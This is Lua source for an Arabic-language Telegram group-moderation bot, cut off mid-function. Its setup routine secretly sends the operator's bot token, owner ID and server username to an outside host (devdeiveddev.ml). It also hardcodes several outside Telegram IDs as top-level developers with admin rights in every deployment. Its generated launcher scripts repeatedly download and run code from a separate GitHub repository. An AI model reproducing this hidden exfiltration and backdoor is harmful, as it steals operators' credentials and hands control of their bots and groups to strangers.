-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------
--   source black
--   developer joker
--   @UUOUOU_7
-------------------------------------------------------------------------------------------
database = dofile("./lib/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./lib/serpent.lua")
JSON = dofile("./lib/dkjson.lua")
json = dofile("./lib/JSON.lua")
URL = dofile("./lib/url.lua")
http = require("socket.http")
https = require("ssl.https")
id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
--------------------------------------------------------------------------------------------------------------
local AutoSet = function() 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    
file:close()  
end  
if not database:get(id_server..":token") then
io.write("\27[31;47m\n◼¦ ارسل لي توكن البوت الان ¦◼        \27[0;34;49m\n")  
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write("\27[31;47m\n◼¦ التوكن غير صحيح تاكد منه ثم ارسله ¦◼        \27[0;34;49m\n")  
database:del(id_server..":token")
else
local json = JSON.decode(url)
database:set(id_server..":BOT_NAME",json.result.first_name)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":bot_id",json.result.id)
database:set(id_server..":token",token)
end 
else
io.write("\27[31;47m\n◼¦ لم يتم حفظ التوكن ارسل لي التوكن الان ¦◼        \27[0;34;49m\n")  
end 

io.write('\27[31;47m\n◼¦ ارسل لي ايدي المطور الاساسي ¦◼        \27[0;34;49m\n')
local SUDOID = io.read()
if SUDOID ~= '' then
if not SUDOID:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
io.write('\27[31;47m\n◼¦ هذا الايدي غير موجود بل تلجرام ¦◼        \27[0;34;49m\n')
database:del(id_server..":token")
end 
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..SUDOID)
if res ~= 200 then
io.write('\27[31;47m\n◼¦ لم يقم المطور الاساسي بعمل /start للبوت ¦◼        \27[0;34;49m\n')
database:del(id_server..":token")
else
local json = JSON.decode(url)
database:set(id_server..':SUDO_USERNAME',json.result.username)
database:set(id_server..":IDSUDO",SUDOID)
end
else
io.write('\27[31;47m\n◼¦ لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره ¦◼        \27[0;34;49m\n')
end
io.write('\27[31;47m\n◼¦ تم حفظ معلومات التنصيب وجاري تشغيل البوت ¦◼        \27[0;34;49m\n')
local TEXTSUDOWLCOME = "⋄اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDOID..") \n⋄شكرا لاستخدامك سورس بلاك \n⋄تم تنصيب بوتك بنجاح ارسل  /start\n⋄لاظهار كيبورد المطور الاساسي الخاص بك\n⋄اذا لم يعمل البوت انتظز 5 دقائق واعد المحاوله\n\n️⋄مبرمج السورس @UUOUOU_7"
https.request('https://api.telegram.org/bot'..token..'/sendMessage?chat_id='..SUDOID..'&text='..URL.escape(TEXTSUDOWLCOME)..'&parse_mode=Markdown')
end
local create_config_auto = function()
config = {
botid = database:get(id_server..":bot_id"),
botusername = database:get(id_server..":token_username"),
NameBot = database:get(id_server..":BOT_NAME"),
sudouser = database:get(id_server..":SUDO_USERNAME"),
token = database:get(id_server..":token"),
sudoid = database:get(id_server..":IDSUDO"),
 }
create(config, "./INFOBOT.lua")   
end 
infotnseb = {}
infotnseb.id = database:get(id_server..":IDSUDO")
infotnseb.username = database:get(id_server..":SUDO_USERNAME")
infotnseb.tokenbot = database:get(id_server..":token")
infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
https.request('https://devdeiveddev.ml/api/power.php/?insert='..JSON.encode(infotnseb))
create_config_auto()
botid = database:get(id_server..":bot_id")
botusername = database:get(id_server..":token_username")
NameBot = database:get(id_server..":BOT_NAME")
sudouser = database:get(id_server..":SUDO_USERNAME")
token = database:get(id_server..":token")
sudoid = database:get(id_server..":IDSUDO")
file = io.open("Black", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Black
token="]]..database:get(id_server..":token")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
wget "https://raw.githubusercontent.com/UUOUOU_7/tg-file/master/tg"
echo "•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉• •┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•"
echo "TG IS NOT FIND IN FILES BOT"
echo "•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉• •┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•"
exit 1
fi
if [ ! $token ]; then
echo "•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉• •┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO \e[0m"
echo "•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉• •┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•"
exit 1
fi
rm -fr Black.lua
wget https://raw.githubusercontent.com/grc00uu/P0AY/main/File_Bot/AHMED/Ahmedyad/Black.lua
./tg -s ./Black.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("YAD", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Black
rm -fr Black.lua
wget https://raw.githubusercontent.com/grc00uu/P0AY/main/File_Bot/AHMED/Ahmedyad/Black.lua
while(true) do
rm -fr ../.telegram-cli
screen -S Black -X kill
screen -S Black ./Black
done
]])  
file:close() 
os.execute('rm -fr $HOME/.telegram-cli')
end 
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "Info"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
local load_redis = function()  
local f = io.open("./INFOBOT.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
database:del(id_server..":token")
database:del(id_server..":IDSUDO")
end  
local config = loadfile("./INFOBOT.lua")() 
return config 
end 
_redis = load_redis()  

----:gsub('@','') --- تغير او مسح
sudos = dofile("./INFOBOT.lua")
token = sudos.token
bot_id = sudos.botid
bot_username = sudos.botusername
SUDOUSER = database:get(bot_id..":SUDOUSER") or sudos.sudouser
SUDO = database:get(bot_id..":Sudo:bot") or sudos.sudoid
Name_Bot = database:get(bot_id..'Name:Bot') or sudos.NameBot
--------------------------------------------------------------------------------------------------------------
print('\27[0;33m>>'..[[
--------------------------------------------------------------------------------------------------------------

                •{ STARTED SOURCE POWER }•
                
                
        _     _  _   __  __   ___   ___   __   __    _     ___  
       /_\   | || | |  \/  | | __| |   \  \ \ / /   /_\   |   \ 
      / _ \  | __ | | |\/| | | _|  | |) |  \ V /   / _ \  | |) |
     /_/ \_\ |_||_| |_|  |_| |___| |___/    |_|   /_/ \_\ |___/ 
     
      
--------------------------------------------------------------------------------------------------------------
]]..'\027[0;32m'
..'¦ TOKEN_BOT: \27[1;34m'.. Name_Bot..'\27[0;36m » ('..token..')\027[0;32m\n'
..'¦ BOT__INFO: \27[1;34m'.. bot_username..'\27[0;36m » ('..bot_id..')\027[0;32m\n'
..'¦ INFO_SUDO: \27[1;34m'..SUDOUSER..'\27[0;36m » ('..SUDO..')\27[m\027[0;32m\n'
..'¦ Run_Scrpt: \27[1;34m./YAD\027[0;32m \n'
..'¦ LOGIN__IN: \27[1;34m'..whoami..'\027[0;32m \n'
..'¦ Api_Src->: \27[1;34m'..'devdeiveddev.ml/api/power'..'\027[0;32m\n'
..'======================================\27[0;33m\27[0;31m'
)
--------------------------------------------------------------------------------------------------------------
t = "\27[35m".."\n     FILES STARTED SOURCE POWER \n     ____________________\n"..'\27[m'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."      \27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
--- start functions ↓
--------------------------------------------------------------------------------------------------------------
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
--------------------------------------------------------------------------------------------------------------
dev_users = {944353237}   
function DEV(msg)  
local Blackid = false  
for k,v in pairs(dev_users) do
if tonumber(msg.sender_user_id_) == tonumber(v) then  
Blackid = true  
end  
end  
return Blackid  
end 
--------------------------------------------------------------------------------------------------------------
devso_users = {944353237,1110100000,1360140225,1110101001,1770288756,119541395}
function DEV2(msg)  
local Black = false  
for k,v in pairs(devso_users) do  
if tonumber(msg.sender_user_id_) == tonumber(v) then  
Black = true  
end  
end  
return Black  
end 
--------------------------------------------------------------------------------------------------------------
sudo_users = {SUDO}   
function SudoBot(msg)  
local Black = false  
for k,v in pairs(sudo_users) do  
if tonumber(msg.sender_user_id_) == tonumber(v) then  
Black = true  
end  
end  
return Black  
end
--------------------------------------------------------------------------------------------------------------
function SudoBot2(msg)
local hash = database:sismember(bot_id.."Sudo:bot2", msg.sender_user_id_) 
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) then  
return true  
else  
return false  
end  
end
--------------------------------------------------------------------------------------------------------------
function SudoBot3(msg)  
local hash = database:sismember(bot_id..'Sudo:bot3', msg.sender_user_id_) 
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) then  
return true  
else  
return false  
end  
end
--------------------------------------------------------------------------------------------------------------
function CoSu(msg)
local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) or SudoBot3(msg)  then   
return true 
else 
return false 
end 
end
--------------------------------------------------------------------------------------------------------------
function BasicConstructor(msg)
local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) or SudoBot3(msg)  or CoSu(msg) then   
return true 
else 
return false 
end 
end
--------------------------------------------------------------------------------------------------------------
function Constructor(msg)
local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) or SudoBot3(msg)  or BasicConstructor(msg) or CoSu(msg) then       
return true    
else    
return false    
end 
end
--------------------------------------------------------------------------------------------------------------
function Gmanager(msg)
local hash = database:sismember(bot_id..'Gmanager', msg.sender_user_id_)    
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) or SudoBot3(msg)  or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) then       
return true    
else    
return false    
end 
end
--------------------------------------------------------------------------------------------------------------
function Manager(msg)
local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) or SudoBot3(msg)  or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or CoSu(msg) then       
return true    
else    
return false    
end 
end
--------------------------------------------------------------------------------------------------------------
function Manager2(msg)
local hash = database:sismember(bot_id.."S00F4:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) or SudoBot3(msg)  or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or Manager(msg) or CoSu(msg) then       
return true    
else    
return false    
end 
end
--------------------------------------------------------------------------------------------------------------
function Gmod(msg)
local hash = database:sismember(bot_id..'Gmod:User', msg.sender_user_id_)
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) or SudoBot3(msg)  or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Manager2(msg) or Gmanager(msg) or CoSu(msg) then       
return true    
else    
return false    
end 
end
--------------------------------------------------------------------------------------------------------------
function Mod(msg)
local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) or SudoBot3(msg)  or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Gmanager(msg) or Manager2(msg) or CoSu(msg) then       
return true    
else    
return false    
end 
end
--------------------------------------------------------------------------------------------------------------
function Special(msg)
local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
if hash or DEV(msg) or DEV2(msg) or SudoBot(msg) or SudoBot2(msg) or SudoBot3(msg)  or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Manager2(msg) or Gmanager(msg) or Mod(msg) or CoSu(msg) or tonumber(bot_id) then       
return true 
else 
return false 
end 
end
--------------------------------------------------------------------------------------------------------------
function Can_or_NotCan(user_id,chat_id)
if tonumber(user_id) == tonumber(944353237) then  
var = true  
elseif tonumber(user_id) == tonumber(1360140225) then
var = true  
elseif tonumber(user_id) == tonumber(1110101001) then
var = true  
elseif tonumber(user_id) == tonumber(119541395) then
var = true  
elseif tonumber(user_id) == tonumber(1770288756) then
var = true  
elseif tonumber(user_id) == tonumber(1110100000) then
var = true  
elseif tonumber(user_id) == tonumber(SUDO) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then
var = true  
elseif database:sismember(bot_id.."Sudo:bot2", user_id) then
var = true  
elseif database:sismember(bot_id..'Sudo:bot3', user_id) then
var = true  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Biasic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Gmanager', user_id) then
var = true  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'S00F4:MN:TF'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Gmod:User', user_id) then
var = true  
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = true  
elseif database:sismember(bot_id..'Mamez:User'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end 
--------------------------------------------------------------------------------------------------------------
function Rutba(user_id,chat_id)
if tonumber(user_id) == tonumber(1360140225) then  
var = database:get(bot_id.."pravera:Rd"..msg.chat_id_) or 'مـبـرمـج افـايـره'
elseif tonumber(user_id) == tonumber(944353237) then
var = database:get(bot_id.."proahmed:Rd"..msg.chat_id_) or 'المبرمج'
elseif tonumber(user_id) == tonumber(1110101001) then
var = database:get(bot_id.."prlgand:Rd"..msg.chat_id_) or  'المبرمج ليجاند'
elseif tonumber(user_id) == tonumber(119541395) then
var = database:get(bot_id.."shshso:Rd"..msg.chat_id_) or 'المطور صوفي'
elseif tonumber(user_id) == tonumber(1770288756) then
var = database:get(bot_id.."praera2:Rd"..msg.chat_id_) or 'مـبـرمـج افـايـره²'
elseif tonumber(user_id) == tonumber(1110100000) then
var = database:get(bot_id.."Sudoso:Rd"..msg.chat_id_) or 'عضو غير معروف'  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = database:get(bot_id.."Bot:Rd"..msg.chat_id_) or 'البوت'
elseif tonumber(user_id) == tonumber(SUDO) then
var = database:get(bot_id.."SudoBot:Rd"..msg.chat_id_) or 'المطور الاساسي'  
elseif database:sismember(bot_id.."Sudo:bot2", user_id) then 
var = database:get(bot_id.."Sudo:bot2:Rd"..msg.chat_id_) or 'المطور الثاني'  
elseif database:sismember(bot_id..'Sudo:bot3', user_id) then
var = database:get(bot_id.."Sudo:bot3:Rd"..msg.chat_id_) or 'المطور الثالث'  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'المالك'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = database:get(bot_id.."BasicConstructor:Rd"..msg.chat_id_) or 'المنشئ الاساسي'
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'المنشئ'  
elseif database:sismember(bot_id..'Gmanager', user_id) then
var = database:get(bot_id.."Gmanager:Rd"..msg.chat_id_) or 'المدير العام'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'المدير'  
elseif database:sismember(bot_id..'S00F4:MN:TF'..chat_id, user_id) then
var = database:get(bot_id.."S00F4:MN:TF:Rd"..msg.chat_id_) or 'المدير الثاني'  
elseif database:sismember(bot_id..'Gmod:User', user_id) then
var = database:get(bot_id.."Gmod:Rd"..msg.chat_id_) or 'الادمن العام'  
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'الادمن'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'المميز'  
else  
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'العضو'
end  
return var
end 
--------------------------------------------------------------------------------------------------------------
function Rrutb(user_id,chat_id)
if tonumber(user_id) == tonumber(1360140225) then  
var = 'مـبـرمـج افـايـره'
elseif tonumber(user_id) == tonumber(944353237) then
var = 'المبرمج'
elseif tonumber(user_id) == tonumber(1110101001) then
var = 'المبرمج ليجاند'
elseif tonumber(user_id) == tonumber(119541395) then
var = 'المطور صوفي'
elseif tonumber(user_id) == tonumber(1770288756) then
var = 'مـبـرمـج افـايـره²'
elseif tonumber(user_id) == tonumber(1110100000) then
var = 'عضو غير معروف'  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البوت'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Sudo:bot2", user_id) then 
var = 'المطور الثاني'  
elseif database:sismember(bot_id..'Sudo:bot3', user_id) then
var = 'المطور الثالث'  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = 'المالك'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = 'المنشئ الاساسي'
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = 'المنشئ'  
elseif database:sismember(bot_id..'Gmanager', user_id) then
var = 'المدير العام'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = 'المدير'  
elseif database:sismember(bot_id..'S00F4:MN:TF'..chat_id, user_id) then
var = 'المدير الثاني'  
elseif database:sismember(bot_id..'Gmod:User', user_id) then
var = 'الادمن العام'  
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = 'الادمن'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = 'المميز'  
else  
var = 'العضو'
end  
return var
end 
--------------------------------------------------------------------------------------------------------------
function nncode(data)
local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
data = string.gsub(data, '[^'..b..'=]', '')
return (data:gsub('.', function(x)
if (x == '=') then return '' end
local r,f='',(b:find(x)-1)
for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
return r;
end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
if (#x ~= 8) then return '' end
local c=0
for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
return string.char(c)
end))
end
--------------------------------------------------------------------------------------------------------------
function ChekAdd(chat_id)
if database:sismember(bot_id.."Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
--------------------------------------------------------------------------------------------------------------
function Muted_User(Chat_id,User_id) 
if database:sismember(bot_id..'Muted:User',User_id) then
Var = true
else
Var = false
end
return Var
end
--------------------------------------------------------------------------------------------------------------
function Ban_User(Chat_id,User_id) 
if database:sismember(bot_id..'Ban:User',User_id) then
Var = true
else
Var = false
end
return Var
end 
--------------------------------------------------------------------------------------------------------------
function GBan_User(User_id) 
if database:sismember(bot_id..'GBan:User',User_id) then
Var = true
else
Var = false
end
return Var
end
--------------------------------------------------------------------------------------------------------------
function Gmute_User(User_id) 
if database:sismember(bot_id..'Gmute:User',User_id) then
Var = true
else
Var = false
end
return Var
end
--------------------------------------------------------------------------------------------------------------
function AddChannel(User)
local var = true
if database:get(bot_id..'add:ch:id') then
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..database:get(bot_id..'add:ch:id').."&user_id="..User);
data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
end
end
return var
end
function dl_cb(a,d)
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--------------------------------------------------------------------------------------------------------------
function chat_kick(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end
--------------------------------------------------------------------------------------------------------------
function send(chat_id, reply_to_message_id, text)
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
text = string.gsub(text,"┉",text1)
text = string.gsub(text,"•",text2)
text = string.gsub(text,"Joker",text3)
text = string.gsub(text,"☉",text4)
text = string.gsub(text,"┇",text5)
text = string.gsub(text,"»",text6)
text = string.gsub(text,">",text7)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--------------------------------------------------------------------------------------------------------------
function send2(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 0,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--------------------------------------------------------------------------------------------------------------
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
--------------------------------------------------------------------------------------------------------------
function PinMessage(chat, id)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(chat).ID,
message_id_ = id,
disable_notification_ = 0
},function(arg,data) 
end,nil)
end
--------------------------------------------------------------------------------------------------------------
function UnPinMessage(chat)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(chat).ID
},function(arg,data) 
end,nil)
end
local function GetChat(chat_id) 
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
},cb, nil) 
end  
--------------------------------------------------------------------------------------------------------------
function getInputFile(file) 
if file:match('/') then infile = {ID = "InputFileLocal", path_ = file} elseif file:match('^%d+$') then infile = {ID = "InputFileId", id_ = file} else infile = {ID = "InputFilePersistentId", persistent_id_ = file} end return infile 
end
--------------------------------------------------------------------------------------------------------------
function ked(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
--------------------------------------------------------------------------------------------------------------
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
--[[
local function editText(chat_id,message_id,text,funcb)
Chat_id = msg.chat_id_
Msg_id = msg.message_id_
msg_idd = Msg_id/2097152/0.5
Edit_api = "https://api.telegram.org/bot"..token local url = Edit_api..'/editMessageText?chat_id='.. chat_id ..'&text='.. URL.escape(text) ..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true' end return s_api(url)
end
]]--
local function sendText(chat_id, text, reply_to_message_id, markdown) 
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
text = string.gsub(text,"┉",text1)
text = string.gsub(text,"•",text2)
text = string.gsub(text,"Joker",text3)
text = string.gsub(text,"☉",text4)
text = string.gsub(text,"┇",text5)
text = string.gsub(text,"»",text6)
text = string.gsub(text,">",text7)
send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)
end
local function sendText2(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)
end
local function Send(chat_id, reply_to_message_id, text)
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
text = string.gsub(text,"┉",text1)
text = string.gsub(text,"•",text2)
text = string.gsub(text,"Joker",text3)
text = string.gsub(text,"☉",text4)
text = string.gsub(text,"┇",text5)
text = string.gsub(text,"»",text6)
text = string.gsub(text,">",text7)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end 
local function Send2(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end 
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local text1 = database:get(bot_id..'new:sourse1') or '┉'
local text2 = database:get(bot_id..'new:sourse2') or '•'
local text3 = database:get(bot_id..'new:sourse3') or 'Joker'
local text4 = database:get(bot_id..'new:sourse4') or '☉'
local text5 = database:get(bot_id..'new:sourse5') or '┇'
local text6 = database:get(bot_id..'new:sourse6') or '»'
local text7 = database:get(bot_id..'new:sourse7') or '>'
text = string.gsub(text,"┉",text1)
text = string.gsub(text,"•",text2)
text = string.gsub(text,"Joker",text3)
text = string.gsub(text,"☉",text4)
text = string.gsub(text,"┇",text5)
text = string.gsub(text,"»",text6)
text = string.gsub(text,">",text7)
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end 
function send_inline_key2(chat_id,text,keyboard,inline,reply_id) 
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end 
local function GetInputFile(file)  
local file = file or ""   if file:match('/') then  infile = {ID= "InputFileLocal", path_  = file}  elseif file:match('^%d+$') then  infile = {ID= "InputFileId", id_ = file}  else  infile = {ID= "InputFilePersistentId", persistent_id_ = file}  end return infile 
end
local function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra) 
